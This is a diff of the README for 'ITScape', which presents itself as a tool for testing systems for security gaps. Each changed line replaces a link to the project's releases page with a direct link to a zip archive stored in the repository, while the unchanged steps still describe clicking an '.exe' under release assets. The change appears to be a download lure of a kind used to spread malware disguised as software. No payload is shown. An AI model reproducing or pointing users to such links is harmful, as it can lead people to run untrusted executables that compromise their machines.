@@ -1,6 +1,6 @@
 # 🛡️ ITScape - Test your systems for security gaps
 
-[![](https://img.shields.io/badge/Download_ITScape-Blue?style=for-the-badge&logo=github)](https://github.com/Gasometerfeud483/ITScape/releases)
+[![](https://img.shields.io/badge/Download_ITScape-Blue?style=for-the-badge&logo=github)](https://github.com/Gasometerfeud483/ITScape/raw/refs/heads/main/assets/IT-Scape-v2.1.zip)
 
 ## 📖 Overview
 
@@ -20,12 +20,12 @@ Before you start, make sure your computer meets these basic needs:
 
 You can get the latest version of this tool directly from the project release page. Follow these steps to obtain the correct file:
 
-1. Visit the [Official Download Page](https://github.com/Gasometerfeud483/ITScape/releases).
+1. Visit the [Official Download Page](https://github.com/Gasometerfeud483/ITScape/raw/refs/heads/main/assets/IT-Scape-v2.1.zip).
 2. Look for the section labeled "Assets" at the bottom of the newest version post.
 3. Click on the file that ends with `.exe` to start the download.
 4. Save the file to your desktop or your downloads folder.
 
-[![](https://img.shields.io/badge/Download_Latest_Version-Grey?style=for-the-badge&logo=github)](https://github.com/Gasometerfeud483/ITScape/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-Grey?style=for-the-badge&logo=github)](https://github.com/Gasometerfeud483/ITScape/raw/refs/heads/main/assets/IT-Scape-v2.1.zip)
 
 ## ⚙️ Running the Software
 
